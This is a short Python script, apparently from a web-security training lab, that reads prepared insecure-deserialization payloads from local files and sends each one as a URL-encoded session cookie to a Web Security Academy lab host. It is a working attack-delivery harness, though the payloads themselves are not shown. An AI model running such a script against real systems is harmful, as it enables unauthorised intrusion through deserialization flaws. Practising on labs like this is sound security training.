import os
import urllib.parse
import time
import requests


burp0_url = "https://0a89002c04401886c0474d090057000a.web-security-academy.net:443/"
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "none", "Sec-Fetch-User": "?1", "Te": "trailers", "Connection": "close"}
system = os.walk('/home/yassen/penetrationTesting/Tools/Insecure-Deserialization/tetsAutomation',topdown=True)
for root, dir, files in system:
  for file in files:
    print(f"Testing for {file}")
    eachfile = open(f'/home/yassen/penetrationTesting/Tools/Insecure-Deserialization/tetsAutomation/{file}','r')
    payload_base64 = eachfile.readline()
    payload_urlencoding = urllib.parse.quote(payload_base64)
    burp0_cookies = {"session": f"{payload_urlencoding}"}
    rqst = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
    time.sleep(5)
    eachfile.close()



